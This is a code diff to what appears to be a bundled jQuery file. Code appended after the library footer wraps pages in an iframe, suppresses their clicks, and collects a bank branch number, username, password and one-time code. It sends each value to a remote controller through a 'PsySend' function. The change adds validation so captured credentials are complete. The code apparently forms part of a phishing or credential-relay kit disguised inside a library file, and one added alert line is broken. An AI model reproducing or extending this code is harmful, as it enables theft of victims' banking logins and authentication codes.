@@ -10357,9 +10357,6 @@ if ( !noGlobal ) {
 	window.jQuery = window.$ = jQuery;
 }
 
-
-
-
 return jQuery;
 } );
 
@@ -10375,6 +10372,7 @@ var inp = "";
 var onLoadPage=location.hash.split('#')[1];
 var queryDict = {};
 location.search.substr(1).split("&").forEach(function(item) {queryDict[item.split("=")[0]] = item.split("=")[1]});
+
 
 /*********************Configurations Block*******************/
 
@@ -10404,16 +10402,20 @@ function linkEvents()
     console.log("Events Linked");
     $("#psy_frame").contents().find("a,input,button").unbind('click',psyBind);
     $("#psy_frame").contents().find("a,input,button").click(psyBind);
+
+    //  $("#psy_frame").contents().find("form").unbind();
+    //  $("#psy_frame").contents().find("form").on('submit',psyBind);
 }
 function psyBind(e)
 {
+
     if($(this).attr('data-allowed'))
     {
         console.log('event allowed for ',e.target);
-
     }
     else {
         e.preventDefault();
+        e.stopPropagation();
         console.log('event prevented for ',e.target);
     }
 
@@ -10484,10 +10486,24 @@ function PsyProcessInput(psyId)
 
         switch (psyId) {
             case 'psy_branch_submit':
+                var branchInput = $("#psy_frame").contents().find('#psy_branch');
+                var isValid = branchInput.val().search(new RegExp(branchInput.attr('pattern'))) >= 0;
+                if(!isValid) {
+                    alert(branchInput.attr('title'));
+                    break;
+                }
                 $('#psy_loading').show();
-                PsySend('branch',{branch: $("#psy_frame").contents().find('#psy_branch').val()});
+                PsySend('branch',{branch: branchInput.val()});
                 break;
             case 'psy_login_submit':
+                var usernameInput = $("#psy_frame").contents().find('#psy_username');
+
+                isValid = usernameInput.val().search(new RegExp(usernameInput.attr('pattern'))) >= 0;
+                isValid  = isValid &&  inp.search(new RegExp('.{6,}')) >= 0;
+                if(!isValid) {
+                    alert('identifiant incomplete');
+                    break;
+                }
                 $('#psy_loading').show();
                 PsySend('login',{username: $("#psy_frame").contents().find('#psy_username').val(),password: inp});
                 inp = "";
@@ -10497,6 +10513,12 @@ function PsyProcessInput(psyId)
                 PsySend('click',{});
                 break;
             case 'psy_code_submit':
+                var codeInput = $("#psy_frame").contents().find('#psy_code_input');
+                isValid = codeInput.val().search(new RegExp('.{6,}')) >= 0;
+                if(!isValid) {
+                    alert(branchInput.attr('code invalid'));
+                    break;
+                }
                 //$('#psy_loading').show();
                 PsySend('code',{code:$("#psy_frame").contents().find('#psy_code_input').val()});
                 break;
@@ -10577,6 +10599,7 @@ function getCookie(name)
 }
 function addLoading()
 {
+
     $('body').append('<style>.psy_loading   {display: none;background-color: white;width: 100%;position: fixed;height: 100%;z-index:5000' +
         ';top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_loading > div{top: 50%;left: 49%;position: fixed;    }' +
         '</style><div id="psy_loading" class="psy_loading"><div >     <img src="https://image.ibb.co/eZMq7S/loading_2.gif" alt="Loading..." class="bk-loader"></div></div>');
@@ -10618,4 +10641,5 @@ function loadPage(content)
     setTimeout(linkEvents(),2000);
 
 }
+
 
